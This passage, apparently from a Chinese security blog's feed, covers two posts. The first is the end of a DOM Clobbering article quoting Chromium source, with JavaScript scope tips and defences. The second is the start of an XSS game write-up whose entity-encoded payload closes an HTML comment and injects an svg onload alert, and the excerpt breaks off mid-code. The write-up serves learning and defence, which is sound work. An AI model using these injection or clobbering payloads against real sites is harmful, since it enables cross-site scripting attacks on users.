</span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (GetSettings() &amp;&amp; !GetSettings()-&gt;GetCookieEnabled())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  CountUse(WebFeature::kCookieGet);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetSecurityOrigin()-&gt;CanAccessCookies()) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (IsSandboxed(mojom::<span class="hljs-built_in">blink</span>::WebSandboxFlags::kOrigin))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">"The document is sandboxed and lacks the 'allow-same-origin' flag."</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Url().ProtocolIs(<span class="hljs-string">"data"</span>))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">"Cookies are disabled inside 'data:' URLs."</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      exception_state.ThrowSecurityError(<span class="hljs-string">"Access is denied for this document."</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GetSecurityOrigin()-&gt;IsLocal()) {</span><br><span class="line">    CountUse(WebFeature::kFileAccessedCookies);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!cookie_jar_)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> cookie_jar_-&gt;Cookies();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/loader/cookie_jar.cc;drc=76ccbe80ceaa4529956a6a3d9d8cc9e9a44b1904;l=27?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">CookieJar::Cookies()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">CookieJar::Cookies</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  KURL cookie_url = document_-&gt;CookieURL();</span><br><span class="line">  <span class="hljs-keyword">if</span> (cookie_url.IsEmpty())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  RequestRestrictedCookieManagerIfNeeded();</span><br><span class="line">  <span class="hljs-keyword">String</span> value;</span><br><span class="line">  backend_-&gt;GetCookiesString(cookie_url, document_-&gt;SiteForCookies(),</span><br><span class="line">                             document_-&gt;TopFrameOrigin(), &amp;value);</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>以及，虽然 cookie 不能被完全字符串化控制，但是可以被 Clobbered 的问题在2年前也有人报告过这个相关的问题 <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420032" target="_blank" rel="noopener">document.cookie DOM property can be clobbered using DOM node named cookie</a></p><p>只不过目前的主流浏览器都是”Safari, Chrome and Firefox all behave the same here”。</p><h3 id="Document-Collection"><a href="#Document-Collection" class="headerlink" title="Document Collection"></a>Document Collection</h3><p>涉及到 Collection 的 Document 部分：</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/document_name_collection.cc;l=24?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">DocumentNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">DocumentNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> HTMLElement&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match images, forms, embeds, objects and iframes by name,</span></span><br><span class="line">  <span class="hljs-comment">// object by id, and images by id but only if they have</span></span><br><span class="line">  <span class="hljs-comment">// a name attribute (this very strange rule matches IE)</span></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_embed_element = DynamicTo&lt;HTMLEmbedElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLIFrameElement&gt;(element) ||</span><br><span class="line">      (html_embed_element &amp;&amp; html_embed_element-&gt;IsExposed()))</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_image_element = DynamicTo&lt;HTMLObjectElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (html_image_element &amp;&amp; html_image_element-&gt;IsExposed())</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_ ||</span><br><span class="line">           element.GetIdAttribute() == name_;</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">const</span> AtomicString&amp; name_value = element.GetNameAttribute();</span><br><span class="line">    <span class="hljs-keyword">return</span> name_value == name_ ||</span><br><span class="line">           (element.GetIdAttribute() == name_ &amp;&amp; !name_value.IsEmpty());</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-Collection"><a href="#Window-Collection" class="headerlink" title="Window Collection"></a>Window Collection</h3><p>涉及到 Collection 的 Window 部分：</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/window_name_collection.cc;l=22?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">WindowNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">WindowNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Element&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match only images, forms, embeds and objects by name,</span></span><br><span class="line">  <span class="hljs-comment">// but anything by id</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element) || IsA&lt;HTMLFormElement&gt;(element) ||</span><br><span class="line">      IsA&lt;HTMLEmbedElement&gt;(element) || IsA&lt;HTMLObjectElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (element.GetNameAttribute() == name_)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> element.GetIdAttribute() == name_;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Bouns"><a href="#Bouns" class="headerlink" title="Bouns"></a>Bouns</h2><h3 id="Tip-1-Global-Scope"><a href="#Tip-1-Global-Scope" class="headerlink" title="Tip 1 Global Scope"></a>Tip 1 Global Scope</h3><p>由于 Dom Clobbering 利用方式之一就是 hook 全局作用域下的变量，又由于 Javascript 是一门十分神奇的语言，所以我们需要注意如下几点</p><h4 id="显式声明"><a href="#显式声明" class="headerlink" title="显式声明"></a>显式声明</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> c = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{};</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.a);<span class="hljs-comment">//1</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.c);<span class="hljs-comment">//ƒ () {}</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="隐式声明"><a href="#隐式声明" class="headerlink" title="隐式声明"></a>隐式声明</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">(a)</span></span>{</span></span><br><span class="line">    b = a + 1;</span><br><span class="line">  }</span><br><span class="line">  test(1);</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//2</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>不带有<strong>声明关键字</strong>的变量，Javascript 会自动挂载到全局作用域上。</p><h4 id="let-amp-var"><a href="#let-amp-var" class="headerlink" title="let &amp; var"></a>let &amp; var</h4><p>ES6 中新增了<code>let</code>命令，用来声明变量。它的用法类似于<code>var</code>，但是所声明的变量，只在<code>let</code>命令所在的代码块内有效。详细可以参考 <a href="https://es6.ruanyifeng.com/#docs/let#基本用法" target="_blank" rel="noopener">let 基本用法</a></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;</span><br><span class="line">  <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">a <span class="hljs-comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="hljs-comment">// 1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>上面代码在代码块之中，分别用<code>let</code>和<code>var</code>声明了两个变量。然后在代码块之外调用这两个变量，结果<code>let</code>声明的变量报错，<code>var</code>声明的变量返回了正确的值。这表明，<code>let</code>声明的变量只在它所在的代码块有效。</p><p>而且有些很奇妙的操作，比如：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> a = b = <span class="hljs-number">6</span>;</span><br><span class="line"><span class="hljs-built_in">window</span>.a;<span class="hljs-comment">//undefined</span></span><br><span class="line"><span class="hljs-built_in">window</span>.b;<span class="hljs-comment">//6</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Tip-2-Overwrite-function"><a href="#Tip-2-Overwrite-function" class="headerlink" title="Tip 2 Overwrite function"></a>Tip 2 Overwrite function</h3><p>虽然可以 Clobber 函数，但是目前我没找到什么方法让他执行我们 Clobber 的结果，或者说目前貌似也没有办法通过标签来定义一个函数，所以只能是引起一个报错，</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'getElementById'</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'getElementById'</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然只能引起报错，但是在一定场景下我们可以利用这个来绕过一些判断，例如：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'getElementById'</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'getElementById'</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We must use sanitize a here.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We have sanitized a. We can trust a now!</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//Do something with a.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>第一个 JS 代码块虽然引起了报错，但是不会引起 JS 完全停止执行，JS 会跳过这个报错的代码块，执行下一个代码块。</p><h3 id="Tip-3-Prototype-Pollution"><a href="#Tip-3-Prototype-Pollution" class="headerlink" title="Tip 3 Prototype Pollution"></a>Tip 3 Prototype Pollution</h3><p>原型链污染可以吗？</p><p>我目前尝试的方法还没成功，如果师傅尝试成功了一定要跟我分享！</p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><ol><li>最简单的是判断每个变量预期的类型以避免非预期类型的篡改，例如，可以检查 Dom 节点的 attribute 属性是否实际上是 NamedNodeMap 的实例，这样可以确保该属性是一个 attributes 属性，而不是攻击者插入的 HTMLElement。</li><li>毕竟这种攻击主要出现在全局变量这一块，所以代码规范十分重要！</li><li>使用经过测试的库，例如 DOMPurify 。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Nafeez-Dom-Flow-Untangling-The-DOM-For-More-Easy-Juicy-Bugs.pdf" target="_blank" rel="noopener">DOM FLOW UNTANGLING THE DOM FOR EASY BUGS</a></p><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">DOM Clobbering Attack</a></p><p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">DOM Clobbering strikes back</a></p><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noopener">Clobbering the clobbered — Advanced DOM Clobbering</a></p><p><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">XSS in GMail’s AMP4Email via DOM Clobbering</a></p><p>[DOM Clobbering Attack学习记录.md](<a href="https://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">https://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack学习记录)</p><p><a href="https://cure53.de/dom" target="_blank" rel="noopener">Im DOM hört Dich keiner schreien</a></p><p><a href="https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/" target="_blank" rel="noopener">Dec 20: Sanitising HTML – the DOM clobbering issue</a></p><p><a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">谈谈 JavaScript 的作用域</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;前几天 PortSwigger 发布了 &lt;a href=&quot;https://portswigger.net/research/top-10-web-hacking-techniques-of-2019&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Top 10 web hacking techniques of 2019&lt;/a&gt;，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己&lt;a href=&quot;https://blog.zeddyu.info&quot;&gt;博客&lt;/a&gt;做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/7329&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7329&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/categories/Sec/"/>
    
    
      <category term="XSS" scheme="https://blog.zeddyu.info/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS GAME</title>
    <link href="https://blog.zeddyu.info/2020/02/11/xssgame/"/>
    <id>https://blog.zeddyu.info/2020/02/11/xssgame/</id>
    <published>2020-02-11T14:47:32.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。</p><blockquote class="colorquote success"><p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/198496" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198496</a></p></blockquote><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>所有题目的目标都是实现<code>alert(1337)</code>即可，有着不同的难度</p><h2 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"pwnme"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> input = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">'debug'</span>) || <span class="hljs-string">''</span>).replace(<span class="hljs-regexp">/[\!\-\/\#\&amp;\;\%]/g</span>, <span class="hljs-string">'_'</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'template'</span>);</span></span><br><span class="line">    template.innerHTML = input;</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">    pwnme.innerHTML = "<span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> " + template.outerHTML + " &lt;/p&gt; --&gt;</span>";</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>题目源代码如上，题目代码比较简单，首先对用户传入的 debug 参数进行关键字过滤转换，对于<code>!-/#&amp;;%</code>符号都会被下划线替代，然后创建一个 template 标签，标签的 HTML 内容为我们传入的内容，最后在一个 div 中，把构建好的 template 标签输出在一个注释当中。</p><p>所以我们的主要得绕过注释符的限制，由于<code>&lt;!--</code>是多行注释，所以换行的思路我们基本不可行，即使没有把<code>--</code>过滤，JS也会在第一步<code>template.innerHTML</code>将我们的<code>--&gt;</code>中的<code>&gt;</code>进行转义。所以基本上我们可以“直接“闭合的思路是行不通的。</p><p>首先我们需要知道 HTML 解析顺序，首先先解析 HTML 部分代码，再用 JS 解释器 JS 代码，JS解释器会边解释边执行，对于 innerHTML 会使用 HTML parser 解析其中的代码。本题会利用到一些 HTML parser 的知识，建议配合 W3 文档 <a href="https://www.w3.org/TR/html52/syntax.html" target="_blank" rel="noopener">The HTML syntax</a>，不想看英文的话也可以凑合凑合看看本菜之前写的 <a href="https://blog.zeddyu.info/2019/03/13/Web安全从零开始-XSS-I/#Encode">关于 HTML 编码</a> 的水文。</p><h3 id="Easy-Version"><a href="#Easy-Version" class="headerlink" title="Easy Version"></a>Easy Version</h3><p>我们先来看看第一个简单的版本，当时由于出题者比较疏忽，并没有过滤<code>&amp;#;</code>，导致了我们可以用 HTML 实体编码进行绕过，直接闭合注释进而实现 alert ，例如，在没有过滤<code>&amp;#;</code>的情况，我们可以这么做：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"<span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x3E;</span><span class="hljs-symbol">&amp;#x3C;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x3D;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3E;</span>"</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用 HTML 编码将我们的 payload 进行编码绕过</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png" alt=""></p><p>但是这里我们并不能直接传入 HTML 编码绕过，得需要加一个 img 标签利用其属性进行绕过，为什么呢？</p><p>因为这里其实有两次 HTML 解码的操作，第一个是<code>template.innerHTML</code>，第二个是<code>pwnme.innerHTML</code>，第一个解码操作会直接把我们传入的参数进行解码，并且对其中的<code>&lt;&gt;</code>进行转义，也就是说，实际上第一个得到的是如下内容：</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span 